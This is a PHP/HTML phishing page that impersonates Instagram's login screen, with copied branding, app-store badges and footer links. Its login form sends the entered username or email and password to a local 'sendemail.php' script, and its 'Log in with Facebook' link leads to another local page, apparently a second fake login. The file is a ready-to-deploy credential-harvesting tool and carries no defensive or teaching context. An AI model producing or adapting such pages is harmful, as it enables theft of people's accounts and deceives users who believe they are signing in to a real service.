<?php ?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
  <link rel="icon" href="./images/logo1.png" type="image/gif" />
  <link rel="stylesheet" href="style.css">
  <title>   Instagram</title>
</head>

<body>


  <div id="wrapper">
    <div class="container">
      <div class="phone-app-demo"></div>
      <div class="form-data">
        <form class="contact" action="sendemail.php" method="post">
          <div class="logo">
            <img src="./images/log.png" alt="logo">
          </div>
          <input type="text"  name="name" placeholder="Phone number, username, or email" required>
          <input type="password"  name="password"  placeholder="Password" required>
          <input class="form-btn" type="submit" name="submit" value="Log in">
          <span class="has-separator">Or</span>
          <a class="facebook-login"  style=" text-decoration: none;" href="index1.php">
            <i class="fab fa-facebook-square" ></i> Log in with Facebook
          </a>
          <a class="password-reset" href="https://www.instagram.com/accounts/password/reset/"style="text-decoration: none;" >Forgot password?</a>
        </form>
        <div class="sign-up"   >
          Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" style=" text-decoration: none;"  >Sign up</a>  </div>
        <div class="get-the-app">
          <span>Get the app.</span>
          <div class="badges">
          <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo" target="_blank"> <img src="./images/app-store.png"></a>
          <a  href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=65F236EA-15F1-492E-80F4-DA63F5E3FBD5&utm_content=lo&utm_medium=badge" 
          target= "_blank">  <img src="./images/google-play.png"></a>
          </div>
        </div>
      </div>
    </div>

    <footer>
      <div class="container">
        <nav class="footer-nav">
          <ul>
            <li>
              <a href="https://about.instagram.com/" target="_blank">About</a>
            </li>            <li>
              <a href="https://about.instagram.com/en_US/blog"  target="_blank">Blog</a>
            </li>
            <li>
              <a href="https://about.instagram.com/about-us/careers"  target="_blank">Jobs</a>
            </li>
            <li>
              <a href="https://help.instagram.com/"  target="_blank">Help</a>

            </li>
            <li>
              <a href="https://developers.facebook.com/docs/instagram"  target="_blank">API</a>
            </li>
            <li>
              <a href="https://help.instagram.com/"  target="_blank">Privacy</a>
            </li>
            <li>
              <a href="https://help.instagram.com/"  target="_blank">Terms</a>
            </li>
            <li>
              <a href="https://www.instagram.com/directory/profiles/"  target="_blank">Top Accounts</a>
            </li>
        
            <li> 
              <a href="https://www.instagram.com/directory/hashtags/"  target="_blank">Hashtags</a>
            </li>
            <li>
              <a href="https://www.instagram.com/explore/locations/"  target="_blank">location</a>
            </li>
          </ul>
        </nav>
      </div>

      
      <div class="copyright-notice">
        © 2021 Instagram from Facebook
        </div>
    </footer>

  </div>


   <!--contact section end-->

   <script type="text/javascript">
   
    </script>

</body>

</html>